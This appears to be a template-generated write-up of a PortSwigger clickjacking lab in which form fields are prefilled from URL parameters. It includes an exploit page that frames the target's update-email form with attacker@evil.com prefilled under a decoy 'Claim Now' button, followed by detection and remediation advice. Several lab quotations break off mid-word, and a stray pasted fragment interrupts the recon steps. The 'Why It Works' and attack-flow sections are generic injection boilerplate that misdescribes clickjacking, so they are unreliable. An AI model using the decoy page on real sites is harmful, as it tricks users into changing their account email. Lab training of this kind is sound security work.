# Clickjacking with form input data prefilled from a URL parameter

### Goal -

Exploit a clickjacking vulnerability where form fields can be prefilled from URL parameters, allowing the attacker to pre-fill malicious values and trick the user into submitting them.



### Vulnerability / Concept

This lab demonstrates a vulnerability in the clickjacking category.

This lab extends the basic clickjacking example in Lab: Basic clickjacking with CSRF token protection. The goal of the lab is to change the email address of the user by prepopulating a form using a URL parameter and enticing the user to inadvertently click on an "Update email" button.

The vulnerability exists because the application fails to properly validate, sanitize, or secure the user-controlled input that reaches a sensitive operation. The specific attack surface and exploitation technique depend on the exact vulnerability type demonstrated in this lab.

### Recon / Initial Analysis

Based on the lab's objective and the PortSwigger solution:

1. Analyze the application's functionality to identify the attack surface
2. Log in to the account on the target website.
                    
                    
                        
                            Go to the exploit server and paste the following HTML templa
3. Use Burp Suite Proxy to intercept and analyze requests
4. Identify the specific vulnerability type by testing user-controlled input
5. Determine the appropriate exploitation technique for this lab

### Exploitation

1. Identify URL parameters that pre-fill form fields on the target page
2. Create an HTML page with a transparent iframe pointing to the target URL with pre-filled malicious values
3. Overlay deceptive UI elements (e.g., a fake "Click here for a prize" button) on top of the invisible form submit button
4. When the user clicks the deceptive button, they actually click the form's submit button in the iframe
5. The form submits with the attacker-controlled pre-filled values

Example exploit page:
```html
<style>
    iframe {
        position: relative;
        width: 500px;
        height: 300px;
        opacity: 0.1;
        z-index: 2;
    }
    .decoy {
        position: absolute;
        top: 50px;
        left: 50px;
        z-index: 1;
    }
</style>
<div class="decoy">
    <h3>Click here for a free gift!</h3>
    <button>Claim Now</button>
</div>
<iframe src="https://TARGET.net/update-email?email=attacker@evil.com"></iframe>
```

### Why It Works

The vulnerability exists because the application processes user-controlled input without adequate security validation. In this specific lab, the attack succeeds because:

- The application trusts the user input without proper server-side validation
- The input reaches a sensitive operation (database query, HTML rendering, system command, etc.) without sanitization
- The security boundary that should protect the operation is missing or incorrectly implemented
- The specific payload used exploits the exact weakness in the application's input handling

The PortSwigger lab description confirms this: "This lab extends the basic clickjacking example in Lab: Basic clickjacking with CSRF token protection. The goal of the lab is to change the email address of the user by prepopulating a form using a UR"

### Attack Flow

**Attack Flow:**

```
Attacker Input (payload in request)
        ↓
Application Functionality (processes user input)
        ↓
Server Processing (no validation/sanitization)
        ↓
Injection Point (input reaches sensitive operation)
        ↓
Exploitation (payload executes as intended)
        ↓
Lab Objective Achieved
```

### Real-World Impact

An attacker could trick users into performing actions they didn't intend (delete account, change email, transfer funds), capture keystrokes, trigger DOM-based XSS, or perform multi-step clickjacking attacks.

### Detection / Testing Methodology

1. Check if the target page can be framed (no X-Frame-Options or frame-ancestors CSP)
2. Verify if the page has JavaScript frame-busting (and test bypass via sandbox attribute)
3. Check if form fields can be pre-filled from URL parameters
4. Identify state-changing actions that could be clickjacked
5. Test if the page can be chained with DOM-based XSS

### Remediation

- Set X-Frame-Options: DENY or SAMEORIGIN
- Use CSP frame-ancestors 'none' or 'self'
- Do not rely on JavaScript frame-busting scripts (they can be bypassed)
- Implement both headers and JavaScript for defense-in-depth
- Do not allow form pre-filling from URL parameters for sensitive forms

### Key Takeaways

- This lab demonstrates a clickjacking vulnerability in a real-world scenario.
- The vulnerability occurs because user input reaches a sensitive operation without proper validation.
- The PortSwigger lab confirms: "This lab extends the basic clickjacking example in Lab: Basic clickjacking with CSRF token protectio"
- Burp Suite is essential for identifying and exploiting this vulnerability.
- The remediation for this specific vulnerability involves: - Set X-Frame-Options: DENY or SAMEORIGIN
